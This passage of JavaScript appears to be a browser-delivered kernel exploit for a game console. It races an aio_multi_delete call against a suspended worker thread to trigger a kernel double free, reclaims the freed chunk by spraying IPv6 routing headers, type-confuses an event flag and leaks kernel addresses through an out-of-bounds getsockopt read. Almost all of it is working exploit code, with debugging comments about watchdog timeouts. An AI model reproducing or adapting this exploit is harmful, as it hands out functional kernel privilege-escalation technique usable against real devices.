        if (wideWindow) {
            const probe = sc(SYS.socket, AF_INET, SOCK_STREAM, 0).i32;
            optval.dv.setInt32(0, CLIENT_SNDBUF, true);
            sc(SYS.setsockopt, probe, SOL_SOCKET, SO_SNDBUF, optval.addr, 4);
            optval.dv.setInt32(0, 0, true);
            optLen.dv.setInt32(0, 4, true);
            const g = sc(SYS.getsockopt, probe, SOL_SOCKET, SO_SNDBUF,
                optval.addr, optLen.addr).i32;
            const snd = g === 0 ? optval.dv.getInt32(0, true) : 0;
            sc(SYS.close, probe);
            wideLen = Math.min(Math.floor(snd / 2), wideBuf.len);
            if (!(snd > 0 && wideLen > PEER_RCVBUF)) {
                wideWindow = false;
                mark("WIDEN-DISABLED", "sndbuf=" + snd + " peer_rcvbuf="
                    + PEER_RCVBUF + " widen=off");
            } else {
                mark("WIDEN", "one " + wideLen + " byte write per attempt, peer "
                    + "receive buffer " + PEER_RCVBUF
                    + " -- soclose should hold for l_linger (1 s), against the "
                    + "0.3 ms an idle close takes");
            }
        } else {
            mark("WIDEN-OFF", "?wide=0 -- running the old microsecond window");
        }

        const WHICH = NUM_REQS - 1;

        /*
        WATCHDOG FIX. PROBE_CAP defaulted to 0, so with the default URL the
        only exits from the rendezvous loop below were the two state checks.
        A connection that lingers in TCPS_ESTABLISHED (SO_LINGER close, slow
        soclose on the console) with the worker chain not yet finished spun
        poll+TCP_INFO ROP calls forever -- that is the "This page is not
        responding" popup at "racing...". The reference race_one() takes
        exactly ONE poll+TCP_INFO sample and decides; a finite cap reproduces
        that without losing the forward-walk. Raise with ?probes= if the log
        says "pinned at the cap".
        */
        /* Default 0 = ONE sample per attempt, which is exactly what the
           reference (lapse-vue.js race_one) does: suspend, poll once,
           TCP_INFO once, decide, resume. The rendezvous walk is our own
           addition and it is what starves the event loop on slow consoles.
           Raise it with ?probes=N only if the PROBE mark shows the walk
           finding the worker still mid-chain and you want the extra wait. */
        const PROBE_CAP = params.has("probes")
            ? parseInt(params.get("probes"), 10) : 0;

        const PRE_SUSPEND_MS = params.has("presleep")
            ? parseInt(params.get("presleep"), 10) : 15;

        const STRICT_TCP = params.get("strict") === "1";
        const YIELD_CAP = params.has("yields")
            ? parseInt(params.get("yields"), 10) : 64;

        const ATTEMPTS = params.has("attempts")
            ? parseInt(params.get("attempts"), 10) : 20;

        const MAX_MISFIRES = params.has("misfires")
            ? parseInt(params.get("misfires"), 10) : 3;
        const MARK_START = 0x5747e100, MARK_END = 0x5747e1ff;
        const S_START = 0x00, S_RET = 0x08, S_END = 0x10;

        const availCores = [];
        for (let i = 0; i < 32; ++i) if (savedMask.low & (1 << i)) availCores.push(i);
        const ONE_CORE = availCores.length
            ? availCores[availCores.length - 1] : MAIN_CORE;
        const ID64 = new int64(0xffffffff, 0xffffffff);
        prioBuf.dv.setUint16(0, RTP_PRIO_REALTIME, true);
        prioBuf.dv.setUint16(2, RTP, true);
        const mp = sc(SYS.rtprio_thread, RTP_SET, 0, prioBuf.addr).i32;
        await fireWorkerAsync(SYS.rtprio_thread, [RTP_SET, 0, prioBuf.addr]);
        const wp = workerRet().i32;
        maskBuf.u8.fill(0); maskBuf.dv.setUint32(0, 1 << ONE_CORE, true);
        const ma = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
            ID64, 0x10, maskBuf.addr).i32;
        await fireWorkerAsync(SYS.cpuset_setaffinity,
            [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, 0x10, maskBuf.addr]);
        const wa = workerRet().i32;
        check("threads-pinned-core" + ONE_CORE + " at realtime",
            mp === 0 && wp === 0 && ma === 0 && wa === 0,
            "rtprio main=" + mp + " worker=" + wp
            + "  affinity main=" + ma + " worker=" + wa);
        if (!(mp === 0 && wp === 0 && ma === 0 && wa === 0)) {
            mark("REFUSING-TO-ARM", "reason=core-pin-failed");
            state("could not pin -- refusing to arm", "bad");
            mark("PROOF-SUMMARY", "pass=" + passCount() + " fail=" + failCount());
            return;
        }

        const tidBuf = alloc(8);
        tidBuf.u8.fill(0);
        await fireWorkerAsync(SYS.thr_self, [tidBuf.addr]);
        const wTid = tidBuf.dv.getUint32(0, true);
        const myTidBuf = alloc(8);
        myTidBuf.u8.fill(0);
        sc(SYS.thr_self, myTidBuf.addr);
        const myTid = myTidBuf.dv.getUint32(0, true);
        check("worker-tid-read-not-ours",
            wTid !== 0 && wTid !== myTid,
            "worker=" + hx(wTid) + " main=" + hx(myTid));
        for (const nm of ["sched_yield", "thr_suspend_ucontext",
            "thr_resume_ucontext"]) {
            if (!stubAddr.get(SYS[nm])) {
                check("stub for " + nm, false, "");
                mark("REFUSING-TO-ARM", "reason=no-stub:" + nm);
                state("missing " + nm, "bad");
                mark("PROOF-SUMMARY", "pass=" + passCount() + " fail=" + failCount());
                return;
            }
        }
        if (!(wTid !== 0 && wTid !== myTid)) {
            mark("REFUSING-TO-ARM", "reason=no-worker-tid");
            state("no worker tid", "bad");
            mark("PROOF-SUMMARY", "pass=" + passCount() + " fail=" + failCount());
            return;
        }
        check("worker-answers-after-being-pinned",
            (await rpc("ping", DEFAULT_RPC_TIMEOUT_MS)) === "pong", "");

        const sprayRthdr = alloc(0x100);
        const leakRthdr = alloc(0x800);
        const leakLen = alloc(4);
        function buildRthdr(rec, size) {
            const n = Math.floor((size - IP6_RTHDR0_SIZE) / IN6_ADDR_SIZE);
            rec.u8.fill(0);
            rec.dv.setUint8(0, 0);
            rec.dv.setUint8(1, n * 2);
            rec.dv.setUint8(2, 0);
            rec.dv.setUint8(3, n);
            return IP6_RTHDR0_SIZE + IN6_ADDR_SIZE * n;
        }
        const sprayRthdrLen = buildRthdr(sprayRthdr, RTHDR_SIZE);
        for (let i = 0; i < IPV6_SOCK_NUM; ++i) {
            const s = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
            if (s === -1) break;
            ipv6Socks.push(s);
        }
        check("reclaim-sockets-open", ipv6Socks.length === IPV6_SOCK_NUM,
            ipv6Socks.length + "/" + IPV6_SOCK_NUM
            + " AF_INET6 sockets, rthdr len 0x" + sprayRthdrLen.toString(16));
        if (ipv6Socks.length !== IPV6_SOCK_NUM) {
            state("cannot stand up the reclaim -- refusing to arm", "bad");
            mark("REFUSING-TO-ARM", "reason=no-reclaim-ready");
            mark("PROOF-SUMMARY", "pass=" + passCount() + " fail=" + failCount());
            return;
        }

        /*
        ASYNC + YIELD. 0x80 rounds x 0x80 sockets x (setsockopt+getsockopt)
        is up to 16k synchronous ROP syscalls in one JS stretch when called
        from inside the race loop -- that is the "This page is not responding"
        popup. These are post-commit reclaim scans (the race itself keeps its
        microsecond timing), so turning the event loop once per round is free
        in terms of race correctness and lets JSC's sweeper run.
        */
        async function findRthdrTwins(rounds, skipFirstSpray) {
            for (let r = 0; r < rounds; ++r) {
                if (r && !(r % 8)) await breathe();
                if (!(r === 0 && skipFirstSpray))
                    for (let i = 0; i < ipv6Socks.length; ++i) {
                        if ((i & 0x1f) === 0x1f) await breathe();
                        sprayRthdr.dv.setUint32(4, i, true);
                        sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6, IPV6_RTHDR,
                            sprayRthdr.addr, sprayRthdrLen);
                    }
                for (let j = 0; j < ipv6Socks.length; ++j) {
                    if ((j & 0x1f) === 0x1f) await breathe();
                    leakLen.dv.setInt32(0, IP6_RTHDR0_SIZE, true);
                    if (sc(SYS.getsockopt, ipv6Socks[j], IPPROTO_IPV6, IPV6_RTHDR,
                        leakRthdr.addr, leakLen.addr).i32 === -1) continue;
                    const idx = leakRthdr.dv.getInt32(4, true);
                    if (idx === j || idx < 0 || idx >= ipv6Socks.length) continue;

                    if (ipv6Socks[idx] === ipv6Socks[j]) { dupSeen++; continue; }
                    const fdA = ipv6Socks[j], fdB = ipv6Socks[idx];
                    const hi = Math.max(j, idx), lo = Math.min(j, idx);
                    ipv6Socks.splice(hi, 1);
                    ipv6Socks.splice(lo, 1);
                    for (let m = 0; m < ipv6Socks.length; ++m)
                        sc(SYS.setsockopt, ipv6Socks[m], IPPROTO_IPV6,
                            IPV6_RTHDR, 0, 0);
                    for (let m = 0; m < 2; ++m) {
                        const ns = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
                        if (ns !== -1) ipv6Socks.push(ns);
                    }
                    return { round: r, a: fdA, b: fdB };
                }
            }
            return null;
        }

        state("racing...", "warn");
        mark("ARMED", "one core " + ONE_CORE + ", suspend rendezvous, attempts=" + ATTEMPTS
            + "  -- the worker now issues a REAL aio_multi_delete");

        let won = false, confirmed = false, twins = null;
        let attemptsUsed = 0, detectorFired = 0;

        let winAt = -1, sprayedAt = -1, heartbeat = 0, setupFail = null;

        let realFrees = 0, benignHits = 0, reclaimFailed = false, misfireCap = false;

        let precommitHits = 0;
        let stuckBytes = 0, stuckOk = 0, stuckFail = 0;

        let inWindowSeen = 0, tooEarlySeen = 0, tooLateSeen = 0;

        let neverStarted = 0, suspendFail = 0, yieldTotal = 0, rendezvous = 0;

        let probeTotal = 0, probeMax = 0, resuspendFail = 0;
        let probeDeadline = 0;

        let dupSeen = 0;
        const phaseAtDecision = [0, 0];
        let lastPollErr = 0, lastTcp = 0, raceErr0 = 0, raceErr1 = 0;
        const tRace = Date.now();
        heartbeat = setInterval(function () {
            post("RACE-PROGRESS", "attempt=" + attemptsUsed
                + " detector_fired=" + detectorFired + " real_frees=" + realFrees
                + " early=" + tooEarlySeen + " window=" + inWindowSeen
                + " late=" + tooLateSeen
                + " freed_at=" + winAt + " sprayed_at=" + sprayedAt
                + " committed=" + committed);
        }, 250);

        for (let it = 0; it < ATTEMPTS && !confirmed; ++it) {
            attemptsUsed = it + 1;
            probeDeadline = 0;
            const client = sc(SYS.socket, AF_INET, SOCK_STREAM, 0).i32;
            optval.dv.setInt32(0, CLIENT_SNDBUF, true);
            sc(SYS.setsockopt, client, SOL_SOCKET, SO_SNDBUF, optval.addr, 4);
            const cr = sc(SYS.connect, client, servAddr.addr, 16).i32;
            const conn = sc(SYS.accept, server, 0, 0).i32;
            if (cr !== 0 || conn === -1) {
                sc(SYS.close, client);
                setupFail = "attempt " + it + " connect=" + cr + " accept=" + conn;
                break;
            }
            sc(SYS.setsockopt, client, SOL_SOCKET, SO_LINGER, lingerBuf.addr, 8);

            if (wideWindow) {
                const wr = sc(SYS.write, client, wideBuf.addr, wideLen).i32;
                if (wr > 0) { stuckBytes += wr; stuckOk++; } else stuckFail++;
            }

            buildReqs1(NUM_REQS, -1);
            reqs1.dv.setInt32(WHICH * AIO_RW_REQ_SIZE + AIO_RW_REQ_FD, client, true);
            sc(SYS.aio_submit_cmd, AIO_CMD_READ | AIO_CMD_MULTI, reqs1.addr,
                NUM_REQS, AIO_PRIORITY_HIGH, aioIds.addr);
            sc(SYS.aio_multi_cancel, aioIds.addr, NUM_REQS, outs.addr);
            sc(SYS.aio_multi_poll, aioIds.addr, NUM_REQS, outs.addr);

            sc(SYS.close, client);

            outs.dv.setUint32(0, 0, true);
            outs.dv.setUint32(4, 0, true);
            shared.u8.fill(0);

            const b = chain(wrkCtx)
                .store(shared.addr.add32(S_START), MARK_START)
                .args([aioIds.addr.add32(WHICH * 4), 1, outs.addr.add32(4)])
                .call(stubAddr.get(SYS.aio_multi_delete))
                .saveRax(shared.addr.add32(S_RET))
                .store(shared.addr.add32(S_END), MARK_END)
                .end();
            layout(wrkCtx, b.insts, b.targetIdx);
            const raceTask = rpc("fire", 0, wrkCtx.S.low, wrkCtx.S.hi);

            let yields = 0;
            while (yields < YIELD_CAP
                && (shared.dv.getUint32(S_START, true) >>> 0) !== MARK_START) {
                sc(SYS.sched_yield);
                yields++;
            }
            const sawStart =
                (shared.dv.getUint32(S_START, true) >>> 0) === MARK_START;
            if (!sawStart) {

                neverStarted++;
                await raceTask;
                sc(SYS.aio_multi_delete, aioIds.addr, NUM_REQS, outs.addr);
                sc(SYS.close, conn);
                continue;
            }
            yieldTotal += yields;

            if (PRE_SUSPEND_MS > 0) {
                preTs.u8.fill(0);
                preTs.dv.setUint32(8, (PRE_SUSPEND_MS * 1000000) >>> 0, true);
                sc(SYS.nanosleep, preTs.addr, 0);
            }

            const susp = sc(SYS.thr_suspend_ucontext, wTid).i32;
            if (susp === 0) rendezvous++;
            if (susp !== 0) {
                suspendFail++;
                sc(SYS.thr_resume_ucontext, wTid);
                await raceTask;
                sc(SYS.aio_multi_delete, aioIds.addr, NUM_REQS, outs.addr);
                sc(SYS.close, conn);
                continue;
            }

            let decided = false;
            try {

                let pollErr = 0, tcpState = 0, wFinished = 0, probes = 0;
                for (; ;) {
                    sc(SYS.aio_multi_poll, aioIds.addr.add32(WHICH * 4), 1,
                        outs.addr);
                    pollErr = outs.dv.getUint32(0, true);

                    infoLen.dv.setInt32(0, TCP_INFO_SIZE, true);
                    sc(SYS.getsockopt, conn, IPPROTO_TCP, TCP_INFO,
                        info.addr, infoLen.addr);
                    tcpState = info.dv.getUint8(0);

                    wFinished =
                        (shared.dv.getUint32(S_END, true) >>> 0) === MARK_END ? 1 : 0;

                    if (tcpState !== TCPS_ESTABLISHED || wFinished) break;
                    /* HARD cap first, before anything else can loop. The
                       watchdog fires at a few seconds; PROBE_CAP rendezvous
                       cycles are bounded by construction, so this can never
                       outrun it. */
                    if (probes >= PROBE_CAP) break;
                    /* WALL-CLOCK cap as a second belt: an attempt that is
                       still undecided after 3 s is recorded as late and the
                       attempt is dropped, exactly like a suspend that never
                       started. No polling loop in this file is unbounded. */
                    if (!probeDeadline) probeDeadline = Date.now() + 3000;
                    else if (Date.now() > probeDeadline) break;

                    sc(SYS.thr_resume_ucontext, wTid);
                    sc(SYS.sched_yield);
                    if (sc(SYS.thr_suspend_ucontext, wTid).i32 !== 0) {
                        resuspendFail++;
                        break;
                    }
                    probes++;
                }
                probeTotal += probes;
                if (probes > probeMax) probeMax = probes;
                if (wFinished) tooLateSeen++; else inWindowSeen++;

                if (pollErr !== SCE_KERNEL_ERROR_ESRCH && !wFinished
                    && (!STRICT_TCP || tcpState !== TCPS_ESTABLISHED)) {
                    detectorFired++;
                    lastPollErr = pollErr; lastTcp = tcpState;
                    phaseAtDecision[0] = wFinished;
                    phaseAtDecision[1] = 1;
                    winAt = it;

                    if (STOP_PRECOMMIT) {

                        precommitHits++;
                        mark("PRECOMMIT-HELD", "attempt=" + it
                            + " delete2=withheld committed=false");
                    } else {
                        sc(SYS.aio_multi_delete,
                            aioIds.addr.add32(WHICH * 4), 1, outs.addr);
                        won = true;
                        committed = true;
                    }
                    decided = true;

                    if (!STOP_PRECOMMIT) {
                        for (let k = 0; k < ipv6Socks.length; ++k) {
                            sprayRthdr.dv.setUint32(4, k, true);
                            sc(SYS.setsockopt, ipv6Socks[k], IPPROTO_IPV6,
                                IPV6_RTHDR, sprayRthdr.addr, sprayRthdrLen);
                        }
                        sprayedAt = it;
                    }
                }
            } finally {

                sc(SYS.thr_resume_ucontext, wTid);
            }

            await raceTask;

            if (won) {
                raceErr0 = outs.dv.getUint32(0, true);
                raceErr1 = outs.dv.getUint32(4, true);
                if (raceErr0 === 0 && raceErr1 === 0) {

                    realFrees++;
                    sprayedAt = it;

                    twins = await findRthdrTwins(0x80, true);
                    confirmed = !!twins;
                    rebootRequired = true;
                    if (!confirmed) {

                        reclaimFailed = true;
                        break;
                    }
                } else {

                    benignHits++;
                    committed = realFrees > 0;
                    if (benignHits >= MAX_MISFIRES) { misfireCap = true; break; }
                }
                won = confirmed;
            }

            sc(SYS.aio_multi_delete, aioIds.addr, NUM_REQS, outs.addr);
            sc(SYS.close, conn);
        }
        const raceMs = Date.now() - tRace;
        if (heartbeat) { clearInterval(heartbeat); heartbeat = 0; }

        if (setupFail) mark("SOCKET-SETUP-FAILED", setupFail);
        mark("RACE-DONE", attemptsUsed + " attempts in " + raceMs + " ms, "
            + "detector fired " + detectorFired + " time(s): " + realFrees
            + " real double free(s), " + benignHits + " harmless misfire(s)");
        if (dupSeen) mark("DUP-FDS", dupSeen + " same-fd pair(s) rejected -- "
            + "closed descriptors were still listed in the socket pool");
        mark("PROBE", "walked the worker forward " + (rendezvous ? (probeTotal / rendezvous).toFixed(1) : "-")
            + " steps on average, worst " + probeMax + " of " + PROBE_CAP
            + ", " + resuspendFail + " re-suspend failures"
            + "   -- pinned at the cap means raise ?probes=");
        mark("DETECTOR", STRICT_TCP
            ? "poll_err+tcp_state+worker_in_delete"
            : "poll_err+worker_in_delete (tcp_state=report-only)");
        mark("STUCK-DATA", stuckOk + " attempts left " + stuckBytes
            + " bytes outstanding, " + stuckFail + " writes failed");
        mark("RENDEZVOUS", rendezvous + " suspends: in-window " + inWindowSeen
            + " / already finished " + tooLateSeen
            + "   handoff cost " + (rendezvous ? (yieldTotal / rendezvous).toFixed(1)
                : "-") + " yields"
            + "   dropped: " + neverStarted + " never started, "
            + suspendFail + " suspend refused");
        /* With the worker frozen at the decision the rate should be near 1.0,
           unlike the 0.33% a spacer could reach. */
        mark("WINDOW-RATE", "in-window at the decision: " + inWindowSeen + "/"
            + (inWindowSeen + tooLateSeen));
        /* Detector hits with no clean double free mean the timing is off --
           try a different ?spacer= before spending another boot. */
        if (misfireCap)
            mark("MISFIRE-CAP", benignHits + " detector hits, no clean free");
        /* The loop stopped rather than free more chunks it cannot account for;
           this chunk is dangling. */
        if (reclaimFailed)
            mark("RECLAIM-FAILED", "double free not reclaimed -- reboot.");
        if (detectorFired) {
            mark("WIN-EVIDENCE", "poll_err=" + hx(lastPollErr)
                + " tcp_state=" + lastTcp
                + "   worker chain at the decision: started="
                + phaseAtDecision[1] + " finished=" + phaseAtDecision[0]
                + "   race_errs=" + hx(raceErr0) + "," + hx(raceErr1));
        }

        check("race-won", detectorFired > 0,
            detectorFired + " detector hits in " + attemptsUsed + " attempts");
        if (STOP_PRECOMMIT) {

            mark("PRECOMMIT-STOP", "held=" + precommitHits + " attempts="
                + attemptsUsed + " committed=false reboot=false");
            check("precommit stopped clean",
                !committed && !rebootRequired,
                "committed=" + committed + " rebootRequired=" + rebootRequired);
        } else {
            check("deletes-reported-success-a-real",
                detectorFired > 0 && raceErr0 === 0 && raceErr1 === 0,
                "race_errs=" + hx(raceErr0) + "," + hx(raceErr1));
            check("freed-chunk-reclaimed-rthdr-data", !!twins,
                twins ? ("twins are fds " + twins.a + " and " + twins.b
                    + " after " + twins.round + " round(s)")
                    : "no twins found");
        }

        if (twins) {
            twinSocks.push(twins.a, twins.b);
            mark("DOUBLE-FREE-ACHIEVED", "fds " + twinSocks.join(" and ")
                + " now alias one 0x80 allocation");

            state("leaking kernel addresses...", "warn");
            /* ASYNC. The stage-2/3 loops below run hundreds to thousands of
               synchronous ROP syscalls; making this IIFE awaitable lets each
               round turn the event loop once, which is what keeps the main
               thread under the browser watchdog. Every return value is a
               boolean, so awaiting changes nothing for the callers. */
            const leakOk = await (async function () {
                function getRthdr(sock, size) {
                    leakLen.dv.setInt32(0, size, true);
                    const r = sc(SYS.getsockopt, sock, IPPROTO_IPV6, IPV6_RTHDR,
                        leakRthdr.addr, leakLen.addr).i32;
                    return r === -1 ? -1 : leakLen.dv.getInt32(0, true);
                }
                function setRthdrOn(sock) {
                    return sc(SYS.setsockopt, sock, IPPROTO_IPV6, IPV6_RTHDR,
                        sprayRthdr.addr, sprayRthdrLen).i32;
                }
                function lk8(off) {
                    return new int64(leakRthdr.dv.getUint32(off, true),
                        leakRthdr.dv.getUint32(off + 4, true));
                }

                /* (hi >>> 16) === 0xffff is the same test as isKernelPtr's
                   (hi >>> 0) >= 0xffff0000. */
                const kptr = isKernelPtr;

                {
                    const ID = new int64(0xffffffff, 0xffffffff);
                    maskBuf.u8.fill(0);
                    maskBuf.dv.setUint32(0, savedMask.low, true);
                    maskBuf.dv.setUint32(4, savedMask.hi, true);
                    const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
                        CPU_WHICH_TID, ID, 0x10, maskBuf.addr).i32;
                    prioBuf.dv.setUint16(0, savedPrio[0], true);
                    prioBuf.dv.setUint16(2, savedPrio[1], true);
                    const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioBuf.addr).i32;
                    mark("SCHED-RELEASED", "affinity=" + ar + " back to "
                        + savedMask + ", rtprio=" + pr + " back to {"
                        + savedPrio + "} -- stage 2 must not run realtime on "
                        + "one core");
                }

                const dirty = twinSocks[0];
                if (sc(SYS.close, twinSocks[1]).i32 === -1) {
                    /*
                    HONEST-FAILURE FIX #3 -- and this is the one that was
                    actually firing.

                    This was the ONLY return-false in the whole stage-2/3
                    chain with no check() in front of it. Every other abort is
                    `if (!check(...)) return false`, which bumps failCount. This
                    one just marked and returned, so leakOk went false, the
                    whole kernel-R/W chain was skipped, and the run still
                    reported pass=51 fail=0 -- the exact screenshot.

                    Closing twinSocks[1] is the operation that frees the
                    shared rthdr, so a -1 here is a real failure (EBADF: the
                    fd table no longer lists it, the alias was lost, nothing
                    downstream can work). Record it.
                    */
                    mark("LEAK-FAIL", "could not close twin " + twinSocks[1]);
                    check("twin-close-freed-the-alias", false,
                        "close(" + twinSocks[1] + ") = -1 -- the twin whose close is supposed to free the shared rthdr, so the 0x80 chunk is still aliased and nothing downstream (evf confusion, aio leak, kbase, repair) can run");
                    return false;
                }
                mark("TWIN-CLOSED", "fd " + twinSocks[1] + " freed the rthdr; "
                    + "fd " + dirty + " still points at it");

                const evfName = alloc(8);
                evfName.u8.fill(0);
                let evf = -1;
                for (let round = 0; round < EVF_ATTEMPTS && evf < 0; ++round) {
                    const evfs = [];
                    for (let i = 0; i < HANDLES_NUM; ++i) {
                        if ((i & 0x1f) === 0x1f) await breathe();
                        evfs.push(sc(SYS.evf_create, evfName.addr, 0,
                            ((i << 0x10) | 0xf00) >>> 0).i32);
                    }

                    if (getRthdr(dirty, 0x80) !== -1) {
                        const marker = leakRthdr.dv.getUint32(0, true);
                        const tag = marker & 0xffff, idx = marker >>> 0x10;
                        if (tag === 0xf00 && idx < evfs.length) {
                            const cand = evfs[idx];

                            sc(SYS.evf_clear, cand, 0);
                            sc(SYS.evf_set, cand, (marker | 1) >>> 0);
                            getRthdr(dirty, 0x80);
                            const m2 = leakRthdr.dv.getUint32(0, true);
                            if ((m2 & 0xffff) === ((tag | 1) & 0xffff)
                                && (m2 >>> 0x10) === idx) {
                                evf = cand;
                                evfs.splice(idx, 1);
                            }
                        }
                    }
                    for (let i = 0; i < evfs.length; ++i)
                        sc(SYS.evf_delete, evfs[i]);
                    if (evf >= 0) mark("EVF-CONFUSED", "evf=" + hx(evf)
                        + " after " + round + " round(s)");
                }
                if (!check("evf-type-confused-rthdr", evf >= 0,
                    evf >= 0 ? "" : EVF_ATTEMPTS + " rounds, no marker")) return false;

                const evfCv = lk8(0x28);

                const reqs2Addr = lk8(0x40).sub32(0x38);
                mark("KADDR-EVF-CV", evfCv.toString());
                mark("KADDR-REQS2", reqs2Addr.toString());
                if (!check("leaked-evf-holds-kernel-pointers",
                    kptr(evfCv) && kptr(reqs2Addr),
                    "cv=" + evfCv + " reqs2=" + reqs2Addr)) return false;

                sc(SYS.evf_clear, evf, 0);
                sc(SYS.evf_set, evf, 0xff00);
                const wide = getRthdr(dirty, 0x800);
                if (!check("read-window-widened-0x800", wide === 0x800,
                    "getsockopt returned " + wide)) return false;

                const leakIds = alloc(HANDLES_NUM * LEAK_NUM_REQS * 4);
                buildReqs1(LEAK_NUM_REQS, -1);
                reqs1.dv.setUint32(0x10, reqs2Addr.add32(4).low, true);
                reqs1.dv.setUint32(0x14, reqs2Addr.add32(4).hi, true);

                const LEAK_NBYTE = params.get("leaknb") === "1" ? 1 : 0;
                if (leakPipeOk && params.get("leakfd") !== "0") {
                    for (let i = 0; i < LEAK_NUM_REQS; ++i) {
                        const o = i * AIO_RW_REQ_SIZE;
                        reqs1.dv.setInt32(o + AIO_RW_REQ_FD, leakPipe[1], true);
                        reqs1.dv.setUint32(o + AIO_RW_REQ_NBYTE, LEAK_NBYTE, true);
                    }
                    mark("LEAK-FD", "every leak request names fd " + leakPipe[1]
                        + " (leak pipe, write end) with nbyte=" + LEAK_NBYTE
                        + " so ar2_file comes back populated");
                }

                function verifyReqs2(base) {
                    if (leakRthdr.dv.getUint32(base + AR2_CMD, true) !== AIO_CMD_WRITE)
                        return false;
                    const pref = [];
                    const want = [AR2_REQS1, AR2_INFO, AR2_BATCH, AR2_QENTRY];
                    for (let i = 0; i < want.length; ++i) {
                        const v = lk8(base + want[i]);
                        if (!kptr(v)) return false;
                        pref.push(v.hi & 0xffff);
                    }
                    const st = leakRthdr.dv.getUint32(base + AR2_RESULT_STATE, true);
                    if (st <= 0 || st > AIO_STATE_ABORTED) return false;
                    if (leakRthdr.dv.getUint32(base + AR2_RESULT_PAD, true) !== 0) return false;

                    const file = lk8(base + AR2_FILE);
                    if (!(file.low === 0 && file.hi === 0) && !kptr(file))
                        return false;
                    const unk2 = lk8(base + AR2_UNK2);
                    if (!(unk2.low === 0 && unk2.hi === 0)) {
                        if (!kptr(unk2)) return false;
                        pref.push(unk2.hi & 0xffff);
                    }
                    return pref.every(function (v) { return v === pref[0]; });
                }

                let reqs2Base = -1;
                for (let round = 0; round < EVF_ATTEMPTS && reqs2Base < 0; ++round) {
                    /* YIELD: one round is 0x100 submits + a 0x800 read + up to
                       0x400 ids of cleanup -- too many for one JS stretch. */
                    if (round) await new Promise(r => setTimeout(r, 0));
                    for (let i = 0; i < HANDLES_NUM; ++i) {
                        if ((i & 0x1f) === 0x1f) await breathe();
                        sc(SYS.aio_submit_cmd, AIO_CMD_WRITE | AIO_CMD_MULTI,
                            reqs1.addr, LEAK_NUM_REQS, AIO_PRIORITY_HIGH,
                            leakIds.addr.add32(i * LEAK_NUM_REQS * 4));
                    }

                    getRthdr(dirty, 0x800);
                    for (let j = 1; j < 0x10; ++j)
                        if (verifyReqs2(j * AIO_ENTRY_SIZE)) { reqs2Base = j * AIO_ENTRY_SIZE; break; }

                    if (reqs2Base >= 0) {
                        mark("REQS2-FOUND", "entry " + (reqs2Base / AIO_ENTRY_SIZE)
                            + " after " + round + " round(s)");
                        break;
                    }
                    for (let o = 0; o < leakIds.len / 4; o += AIO_MAX_NUM) {
                        const step = Math.min(AIO_MAX_NUM, leakIds.len / 4 - o);
                        sc(SYS.aio_multi_cancel, leakIds.addr.add32(o * 4), step, outs.addr);
                        sc(SYS.aio_multi_poll, leakIds.addr.add32(o * 4), step, outs.addr);
                        sc(SYS.aio_multi_delete, leakIds.addr.add32(o * 4), step, outs.addr);
                    }
                }
                if (!check("full-aio_entry-leaked", reqs2Base >= 0,
                    reqs2Base >= 0 ? "at +0x" + reqs2Base.toString(16)
                        : "no entry passed verification")) return false;

                const reqs1Addr = lk8(reqs2Base + AR2_REQS1);
                const aioInfoAddr = lk8(reqs2Base + AR2_INFO);
                const reqs1Aligned = new int64(reqs1Addr.low & 0xffffff00, reqs1Addr.hi);
                mark("KADDR-REQS1", reqs1Aligned.toString()
                    + "  (raw " + reqs1Addr + ")");
                mark("KADDR-AIO-INFO", aioInfoAddr.toString());

                const leakFp = lk8(reqs2Base + AR2_FILE);
                if (kptr(leakFp)) kLeakFp = leakFp;
                /* A kernel pointer here is the leak pipe's struct file, good
                   for the whole run; otherwise stage 4 falls back to
                   aio_info+8 exactly as before. */
                mark("KADDR-AR2-FILE", leakFp + (kptr(leakFp)
                    ? "  (struct file)" : "  (not a kernel pointer)"));
                /* Correlate this with whether curproc works: if the aio_info
                   route only ever succeeds for one particular index, that
                   confirms ar2_info is per-entry. */
                mark("LEAK-ENTRY-INDEX", "window entry "
                    + (reqs2Base / AIO_ENTRY_SIZE)
                    + " -- correlate this with whether curproc works: if the "
                    + "aio_info route only ever succeeds for one particular "
                    + "index, that confirms ar2_info is per-entry");

                let targetId = 0, restFrom = -1;
                const totalIds = leakIds.len / 4;

                mark("TARGET-SEARCH", "scanning " + (totalIds / LEAK_NUM_REQS)
                    + " batches, each cancel + 0x800 OOB read");
                let lastRthdrLen = -1;
                for (let b = 0; b < totalIds; b += LEAK_NUM_REQS) {
                    sc(SYS.aio_multi_cancel, leakIds.addr.add32(b * 4),
                        LEAK_NUM_REQS, outs.addr);
                    const gr = getRthdr(dirty, 0x800);
                    /* YIELD: this scan is up to 256 batches x 2 syscalls; turn
                       the event loop every 8 batches (~16 ROP calls). */
                    if (b && (b / LEAK_NUM_REQS) % 8 === 0)
                        await breathe();
                    if ((b / LEAK_NUM_REQS) % 32 === 0)
                        mark("TARGET-SCAN", "batch " + (b / LEAK_NUM_REQS)
                            + " rthdr_len=" + gr);

                    if (gr !== 0x800) {
                        mark("TARGET-WINDOW-LOST", "batch " + (b / LEAK_NUM_REQS)
                            + " getsockopt returned " + gr + ", expected 2048 -- "
                            + "the confused evf no longer controls ip6r0_len");
                        break;
                    }
                    lastRthdrLen = gr;
                    if (leakRthdr.dv.getUint32(reqs2Base + AR2_RESULT_STATE, true)
                        === AIO_STATE_ABORTED) {
                        targetId = leakIds.dv.getUint32(b * 4, true);
                        leakIds.dv.setUint32(b * 4, 0, true);
                        restFrom = b + LEAK_NUM_REQS;
                        mark("TARGET-ID", hx(targetId) + " at batch "
                            + (b / LEAK_NUM_REQS));
                        break;
                    }
                }
                if (!check("target_id was identified", targetId !== 0,
                    restFrom >= 0 ? "" : "no batch aborted the leaked entry"))
                    return false;

                for (let o = restFrom; o < totalIds; o += AIO_MAX_NUM) {
                    const step = Math.min(AIO_MAX_NUM, totalIds - o);
                    sc(SYS.aio_multi_cancel, leakIds.addr.add32(o * 4), step, outs.addr);
                }
                for (let o = 0; o < totalIds; o += AIO_MAX_NUM) {
                    const step = Math.min(AIO_MAX_NUM, totalIds - o);
                    sc(SYS.aio_multi_poll, leakIds.addr.add32(o * 4), step, outs.addr);
